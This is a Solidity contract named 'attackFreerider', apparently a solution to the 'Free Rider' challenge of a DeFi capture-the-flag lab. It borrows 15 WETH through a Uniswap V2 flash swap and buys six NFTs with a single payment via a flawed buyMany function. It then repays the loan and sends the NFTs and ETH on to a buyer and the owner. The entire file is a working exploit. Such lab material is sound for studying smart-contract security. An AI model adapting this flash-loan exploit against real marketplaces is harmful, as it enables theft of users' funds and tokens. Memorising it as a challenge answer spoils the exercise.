//SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

import "@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";

/**
 * @title ERC721 token receiver interface
 * @dev Interface for any contract that wants to support safeTransfers
 * from ERC721 asset contracts.
 */
interface IERC721Receiver {
    /**
     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
     * by `operator` from `from`, this function is called.
     *
     * It must return its Solidity selector to confirm the token transfer.
     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
     *
     * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
     */
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

interface IMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IWETH {
    function deposit() external payable;

    function withdraw(uint256 amount) external payable;

    function transfer(address to, uint256 amount) external returns (bool);

    function approve(address guy, uint256 wad) external returns (bool);
}

interface IERC721 {
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;
}

contract attackFreerider is IERC721Receiver {
    IMarketplace marketplace;
    IWETH immutable WETH;
    IERC721 NFT;
    IUniswapV2Pair pair;

    address immutable factory;
    address DVT;
    address owner;
    address buyer;

    uint256[] tokens = [0, 1, 2, 3, 4, 5];

    constructor(
        address _factory,
        address _weth,
        address _marketplace,
        address _buyer,
        address _nft,
        address _pair,
        address _dvt
    ) public {
        marketplace = IMarketplace(_marketplace);
        WETH = IWETH(_weth);
        pair = IUniswapV2Pair(_pair);
        NFT = IERC721(_nft);

        factory = _factory;
        owner = msg.sender;
        buyer = _buyer;
        DVT = _dvt;
    }

    function attack() external payable {
        bytes memory data = bytes("0x1");
        pair.swap(15 ether, 0, address(this), data);
    }

    // gets WETH via a V2 flash swap, converts to ETH, buys NFTs, transfers NFTs, repays flash swap
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        address[] memory path = new address[](2);
        uint256 amountToken = amount1;
        uint256 amountETH = amount0;

        path[0] = address(WETH);
        path[1] = DVT;

        /*  uint256 amountRequired = UniswapV2Library.getAmountsIn(
            factory,
            amountToken,
            path
        )[0]; */

        WETH.approve(address(WETH), 15 ether);
        WETH.withdraw(15 ether);
        uint256[] memory tokenIds = tokens;

        marketplace.buyMany{value: 15 ether}(tokenIds);

        WETH.deposit{value: 15.1 ether}();

        WETH.transfer(msg.sender, 15.1 ether); // return WETH to V2 pair
    }

    function transferToBuyer() external onlyOwner {
        for (uint256 i; i < 6; i++) {
            NFT.safeTransferFrom(address(this), buyer, i);
        }
    }

    function withdraw() external {
        (bool success, ) = payable(owner).call{value: address(this).balance}(
            ""
        );
        require(success);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not authorized");
        _;
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes calldata
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
